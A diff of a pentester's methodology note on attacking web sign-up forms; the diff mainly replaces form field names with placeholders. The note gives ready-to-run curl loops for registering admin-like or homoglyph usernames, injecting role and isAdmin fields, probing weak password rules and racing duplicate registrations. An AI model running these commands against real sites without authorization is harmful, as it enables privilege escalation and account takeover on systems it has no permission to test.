@@ -1,8 +1,6 @@
 
 Attacks against user registration / sign-up flows. Entry from [[Web Attack Checksheet]] sub-block 1.7 on register form observation.
 
-Sister files: [[Username Enumeration]] (register-form enumeration signal), [[Credential Attacks]] (creds recovered may feed login), [[Login Bypass Techniques]] (bypass may include register-then-login).
-
 Ordering: privileged username registration first (fast, high P if app naively trusts registration input); weak password policy check (reveals what's allowed, sometimes lets you register admin-adjacent accounts); parameter tampering during registration (role/permission escalation); account creation race conditions; post-registration surface enumeration (authenticated re-walk).
 
 ---
@@ -16,7 +14,7 @@ Some apps naively allow registration with system usernames (admin, root, adminis
 ```bash
 for u in admin administrator root superuser sysadmin operator manager guest support; do
   echo -n "register $u → "
-  curl -sX POST -d "username=$u&email=$u@attacker.tld&password=Attacker1234&cpassword=Attacker1234" http://<host>:<port>/<signup_path> -o /dev/null -w '[%{http_code}]\n'
+    curl -sX POST -d "<register_username_field>=$u&<register_email_field>=$u@attacker.tld&<register_password_field>=Attacker1234&<register_confirm_password_field>=Attacker1234" http://<host>:<port>/<register_form_action> -o /dev/null -w '[%{http_code}]\n'
 done
 ```
 
@@ -38,7 +36,7 @@ Character-level variations that may bypass uniqueness checks while ending up int
 ```bash
 for u in "admin " " admin" "Admin" "ADMIN" "admın" "аdmin" "admin%00" "admin\t" "admin."; do
   echo -n "register [$u] → "
-  curl -sX POST --data-urlencode "username=$u" --data-urlencode "email=x@attacker.tld" --data-urlencode "password=Attacker1234" --data-urlencode "cpassword=Attacker1234" http://<host>:<port>/<signup_path> -o /dev/null -w '[%{http_code}]\n'
+    curl -sX POST --data-urlencode "<register_username_field>=$u" --data-urlencode "<register_email_field>=x@attacker.tld" --data-urlencode "<register_password_field>=Attacker1234" --data-urlencode "<register_confirm_password_field>=Attacker1234" http://<host>:<port>/<register_form_action> -o /dev/null -w '[%{http_code}]\n'
 done
 ```
 
@@ -69,19 +67,19 @@ Extra parameters may be accepted and assign privileges the UI doesn't offer.
 **Try adding privilege-adjacent fields:**
 
 ```bash
-curl -sX POST -d 'username=attacker&email=a@x.com&password=Attacker1234&cpassword=Attacker1234&role=admin&isAdmin=true&is_admin=1&admin=1&user_type=admin&privilege=admin&group=administrator&roleId=1' -i http://<host>:<port>/<signup_path>
+curl -sX POST -d '<register_username_field>=attacker&<register_email_field>=a@x.com&<register_password_field>=Attacker1234&<register_confirm_password_field>=Attacker1234&role=admin&isAdmin=true&is_admin=1&admin=1&user_type=admin&privilege=admin&group=administrator&roleId=1' -i http://<host>:<port>/<register_form_action>
 ```
 
 **Try JSON body variant:**
 
 ```bash
-curl -sX POST -H 'Content-Type: application/json' -d '{"username":"attacker","email":"a@x.com","password":"Attacker1234","cpassword":"Attacker1234","role":"admin","isAdmin":true}' -i http://<host>:<port>/<signup_path>
+curl -sX POST -H 'Content-Type: application/json' -d '{"<register_username_field>":"attacker","<register_email_field>":"a@x.com","<register_password_field>":"Attacker1234","<register_confirm_password_field>":"Attacker1234","role":"admin","isAdmin":true}' -i http://<host>:<port>/<register_form_action>
 ```
 
 **Try nested object injection (JavaScript object prototype pollution vector):**
 
 ```bash
-curl -sX POST -H 'Content-Type: application/json' -d '{"username":"attacker","email":"a@x.com","password":"Attacker1234","cpassword":"Attacker1234","permissions":{"admin":true}}' -i http://<host>:<port>/<signup_path>
+curl -sX POST -H 'Content-Type: application/json' -d '{"<register_username_field>":"attacker","<register_email_field>":"a@x.com","<register_password_field>":"Attacker1234","<register_confirm_password_field>":"Attacker1234","permissions":{"admin":true}}' -i http://<host>:<port>/<register_form_action>
 ```
 
 Route:
@@ -100,7 +98,7 @@ If app allows extremely weak passwords, common passwords work universally — ev
 ```bash
 for p in "a" "12" "123" "abc" "password" ""; do
   echo -n "register with password [$p] → "
-  curl -sX POST --data-urlencode "username=weak_$RANDOM" --data-urlencode "email=x@x.com" --data-urlencode "password=$p" --data-urlencode "cpassword=$p" http://<host>:<port>/<signup_path> -o /dev/null -w '[%{http_code}]\n'
+    curl -sX POST --data-urlencode "<register_username_field>=weak_$RANDOM" --data-urlencode "<register_email_field>=x@x.com" --data-urlencode "<register_password_field>=$p" --data-urlencode "<register_confirm_password_field>=$p" http://<host>:<port>/<register_form_action> -o /dev/null -w '[%{http_code}]\n'
 done
 ```
 
@@ -123,7 +121,7 @@ Race conditions during registration may allow:
 
 ```bash
 for i in $(seq 1 20); do
-  curl -sX POST -d "username=race_test&email=r$i@x.com&password=Attacker1234&cpassword=Attacker1234" http://<host>:<port>/<signup_path> &
+    curl -sX POST -d "<register_username_field>=race_test&<register_email_field>=r$i@x.com&<register_password_field>=Attacker1234&<register_confirm_password_field>=Attacker1234" http://<host>:<port>/<register_form_action> &
 done
 wait
 ```
@@ -149,8 +147,9 @@ Successful registration yields an authenticated foothold — even if the account
 **Register test account (if not already done above):**
 
 ```bash
-curl -sX POST -c cookies.txt -d 'username=test_recon&email=x@x.com&password=Attacker1234&cpassword=Attacker1234' http://<host>:<port>/<signup_path>
-curl -sX POST -c cookies.txt -b cookies.txt -d 'username=test_recon&password=Attacker1234' http://<host>:<port>/<login_path>
+curl -sX POST -c cookies.txt -d '<register_username_field>=test_recon&<register_email_field>=x@x.com&<register_password_field>=Attacker1234&<register_confirm_password_field>=Attacker1234' http://<host>:<port>/<register_form_action>
+
+curl -sX POST -c cookies.txt -b cookies.txt -d '<login_username_field>=test_recon&<login_password_field>=Attacker1234' http://<host>:<port>/<login_form_action>
 ```
 
 **Post-registration URL inspection.** After registration, note the URL the app redirects to. Common patterns leak user identifier:
